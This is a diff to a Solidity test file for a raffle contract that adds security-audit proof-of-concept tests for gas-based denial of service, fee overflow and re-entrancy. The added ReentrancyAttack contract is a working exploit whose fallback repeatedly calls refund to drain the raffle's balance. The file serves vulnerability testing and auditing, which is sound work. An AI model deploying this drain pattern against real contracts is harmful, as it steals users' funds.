@@ -212,6 +212,7 @@ contract PuppyRaffleTest is Test {
 
     //!!! AUDIT
 
+    //! DoS
     function test_DoS_revert_exceeded_block_limit_on_enter_raffle() public {
         uint256 numOfPlayers = 240;
         address[] memory players = new address[](numOfPlayers);
@@ -247,5 +248,61 @@ contract PuppyRaffleTest is Test {
         console.log("Gas Cost for the first 100 users: ", gasUsedFirst);
         console.log("Gas Cost for the second 100 users: ", gasUsedSecond);
         assert(gasUsedFirst < gasUsedSecond);
+    }
+
+    //! Re-entrancy
+    function test_REENTRANCY_on_refund() public playersEntered {
+        ReentrancyAttack attacker = new ReentrancyAttack(puppyRaffle, entranceFee);
+        uint256 startingAttackerBal = address(attacker).balance;
+        uint256 startingBal = address(puppyRaffle).balance;
+        address attackerAddress = makeAddr("attacker");
+        hoax(attackerAddress);
+        attacker.attack{value: entranceFee}();
+        assertEq(address(puppyRaffle).balance, 0);
+        assertEq(address(attacker).balance, startingBal + entranceFee);
+    }
+
+    //! Arithmetic Overflow
+    function test_total_fees_overflow() public {
+        uint256 numOfPlayers = 240;
+        address[] memory players = new address[](numOfPlayers);
+        for (uint256 i = 0; i < numOfPlayers; ++i) {
+            players[i] = address(uint160(i));
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * numOfPlayers}(players);
+        uint256 expectedTotalFees = (address(puppyRaffle).balance * 20) / 100;
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 actualTotalFees = puppyRaffle.totalFees();
+        assert(expectedTotalFees != actualTotalFees);
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+}
+
+contract ReentrancyAttack {
+    PuppyRaffle puppyRaffle;
+    uint256 private index;
+    uint256 private entranceFee;
+
+    constructor(PuppyRaffle _puppyRaffle, uint256 _entranceFee) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = _entranceFee;
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        uint256 _index = puppyRaffle.getActivePlayerIndex(address(this));
+        index = _index;
+        puppyRaffle.refund(_index);
+    }
+
+    fallback() external payable {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(index);
+        }
     }
 }
